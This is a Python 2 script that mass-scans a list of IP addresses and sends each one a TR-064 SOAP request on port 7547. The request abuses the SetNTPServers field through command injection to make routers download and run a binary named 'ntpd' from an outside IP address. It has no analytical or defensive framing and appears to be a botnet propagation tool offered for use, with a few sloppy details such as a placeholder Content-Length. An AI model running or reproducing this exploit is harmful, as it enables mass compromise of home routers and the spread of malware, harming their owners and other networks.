#!/usr/bin/python

import threading, sys, time, random, socket, re, os

if len(sys.argv) < 2:
        print "Usage: python "+sys.argv[0]+" <list>"
        sys.exit()

ips = open(sys.argv[1], "r").readlines()
cmd = """POST /UD/act?1 HTTP/1.1\r\n
Host: 127.0.0.1:7547\r\n
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n
SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\n
Content-Type: text/xml\r\n
Content-Length: length of string after return/newline\r\n
<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"> <SOAPENV:Body> <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\"> <NewNTPServer1>`cd /tmp; wget http://195.2.252.159/ntpd; chmod 777 ntpd; ./ntpd`</NewNTPServer1> <NewNTPServer2></NewNTPServer2> <NewNTPServer3></NewNTPServer3> <NewNTPServer4></NewNTPServer4> <NewNTPServer5></NewNTPServer5> </u:SetNTPServers> </SOAPENV:Body></SOAP-ENV:Envelope>\r\n\r\n"""
count = 0
def readUntil(tn, string, timeout=15):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

class hackify(threading.Thread):
        def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
        def run(self):
		try:
			tn = socket.socket()
			tn.settimeout(8)
			tn.connect((self.ip,7547))
		except Exception:
			tn.close()

		try:
			mp = ''
			mp += tn.recv(1024)
			if "" in mp:
				tn.send(cmd + "\n"); print "\033[32m[%s] command sent %s!\033[37m"%(count, self.ip); time.sleep(10); tn.close()
		except Exception:
			print "\033[34m[%s] TIMEOUT"%(self.ip)
			tn.close()

print "Total IPs: %s\n"%(len(ips))
for ip in ips:
        try:
		count += 1
		t = hackify(ip)
		t.start()
		time.sleep(0.01)
        except:
            pass